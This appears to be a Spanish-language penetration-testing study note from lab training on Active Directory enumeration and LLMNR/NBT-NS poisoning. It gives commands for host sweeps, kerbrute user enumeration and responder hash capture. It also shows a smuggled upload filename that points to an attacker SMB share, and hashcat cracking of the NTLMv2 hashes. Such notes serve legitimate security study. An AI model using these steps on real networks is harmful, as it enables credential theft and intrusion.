#enum

## Key data points

|**Elemento**|**Descripción**|
|---|---|
|`AD Users`|Enumerar usuarios para password spraying.|
|`AD Joined Computers`|Identificar DCs, servidores SQL, web, Exchange, etc.|
|`Key Services`|Kerberos, NetBIOS, LDAP, DNS.|
|`Vulnerable Hosts`|Buscar hosts rápidos de explotar.|

## Herramientas
- Identificación pasiva seguida de validación activa 
### `fping`: Búsqueda masiva de IP´s por ICMP
```bash
fping -asgq 172.16.5.0/23
```
- Después podemos utilizar nmap con los targets obtenidos
	```bash
	sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum -oN allTargets
	```
### `kerbrute`: Enumerar usuarios
Interesante utilizar junto con listas como `jsmith.txt` o `jsmith2.txt` de [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames)
```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```
Si da algún problema con el output, se pueden conseguir los mismos resultados del siguiente modo: 
```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
cat valid_ad_users | grep VALID | awk '{print $7}' > usernamesDomain.txt
```
## LLMNR/NBT-NS Possoning
[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT-NS) son métodos alternativos de resolución de nombres que pueden ser usados cuando falla el DNS. Cualquier host puede responder utilizando alguno de los protocolos mencionados. 
## Linux - `responder`
- Aunque hay muchas maneras en las que se puede capturar un hash, en `offsec` nos ponen un ejemplo muy simple en el que nos podemos conectar a través de una `bindshell` preparada por ellos
	```bash
	nc $target 4444
	# una vez conectados, intentamos acceder al contenido inexistente de una carpeta en dond está corriendo responder
	dir  \\$vpnip\test
	# y responder capturará el hash
	```
- Otra idea interesante es: en una web en la que podemos subir archivos, hacer que el nombre del archivo apunte a un recurso `smb` inexistente
	```bash
	Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.45.244\test"
	```
### Configuración - `responder.conf`
Se pueden configurar los protocolos sobre los que actúar. Por defecto alojado en: 
```
/usr/share/responder
```
### Logs
Además de mostrar por pantalla los logs, responder guarda en un log la información recopilada: 
```
/usr/share/responder/logs
```
### Responder con configuración por defecto
```bash
sudo responder -I ens224
```
### Craquear NTMLv2 con hashcat
El hash que se captura en el paso anterior es un hash NTMLv2 ( [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)) 
```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

## Puertos comunes en una máquina Windows
Estos puertos suelen estar abiertos en **cualquier sistema Windows**:

| **Puerto**          | **Servicio**      | **Descripción**                            |
| ------------------- | ----------------- | ------------------------------------------ |
| **135**             | msrpc             | **RPC Endpoint Mapper** (COM/DCOM)         |
| **139**             | netbios-ssn       | **NetBIOS** (SMB v1)                       |
| **445**             | microsoft-ds      | **SMB** (archivos compartidos)             |
| **3389**            | ms-wbt-server     | **RDP** (Escritorio Remoto)                |
| **5985-5986,47001** | wsman             | **WinRM** (Administración remota por HTTP) |
| **49664+**          | **Dynamic Ports** | **Puertos efímeros de Windows**            |
